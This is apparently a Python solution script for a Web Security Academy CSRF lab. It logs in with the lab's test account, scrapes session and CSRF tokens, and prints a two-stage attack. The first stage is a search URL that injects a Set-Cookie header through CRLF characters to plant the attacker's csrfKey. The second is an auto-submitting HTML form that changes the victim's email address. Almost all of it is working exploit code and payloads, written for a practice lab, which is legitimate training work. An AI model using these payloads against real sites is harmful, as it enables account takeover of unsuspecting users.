import http.client
import re
import ssl
import urllib

LAB_ID = "????"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf_key: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}; csrfKey={csrf_key}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_myaccount(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account?id=wiener'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf_key = re.findall(r'csrfKey=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=csrf value=([a-zA-Z0-9]+)', response.read().decode('utf-8'))[0]
    return session, csrf_key, csrf


def login_session() -> str:
    session, csrf_key, csrf = login_csrf()
    response = POST_login(session, csrf_key, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def change_email_csrf(session: str) -> tuple[str, str]:
    response = GET_myaccount(session)
    cookie_header = response.getheader('set-cookie')
    csrf_key = re.findall(r'csrfKey=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=csrf value=([a-zA-Z0-9]+)', response.read().decode('utf-8'))[0]
    return csrf_key, csrf


session = login_session()
csrf_key, csrf_token = change_email_csrf(session)
print("first stage (sets the 'csrfKey' cookie):")
print(f"https://{LAB_ID}.web-security-academy.net/?" +
      f"search=xxx%3B+Secure%3B+HttpOnly%3B%0D%0A" +
      f"Set-Cookie%3A+csrfKey%3D{csrf_key}%3B+Secure%3B+HttpOnly")
print("second stage (csrf attack form with associated csrf token):")
print(f"""
<html>
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
    <input type="hidden" name="csrf" value="{csrf_token}" />
</form>
<script>
    document.forms[0].submit();
</script>
</body>
</html>
""")
